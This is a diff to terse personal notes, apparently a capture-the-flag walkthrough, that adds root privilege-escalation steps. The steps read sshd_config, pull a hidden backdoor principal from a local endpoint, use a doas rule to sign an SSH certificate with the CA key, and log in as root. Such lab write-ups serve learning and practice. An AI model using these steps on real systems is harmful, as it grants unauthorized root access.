@@ -50,10 +50,22 @@ get the private key
 permit keepenv :wheel
 permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
 
-8. 
-doas -u userca /usr/bin/ssh-keygen -f /tmp/userca
-doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -n root -I terry /tmp/userca.pub
+8. cat /etc/ssh/sshd_config
+... 
+TrustedUserCAKeys /home/userca/ca.pub
+AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u
+AuthorizedPrincipalsCommandUser nobody
+...
 
-9. ssh-keygen -Lf /tmp/userca-cert.pub   (view cert info)
+9.ypuffy$ curl "http://127.0.0.1/sshauth?type=principals&username=root"
+3m3rgencyB4ckd00r
+
+10.
+ssh-keygen generate alice key pair 
+doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I bob8791 /tmp/id_rsa.pub
+ssh-keygen -Lf ~/.ssh/id_rsa-cert.pub   (view cert info)
+
+ssh root
+
 
 
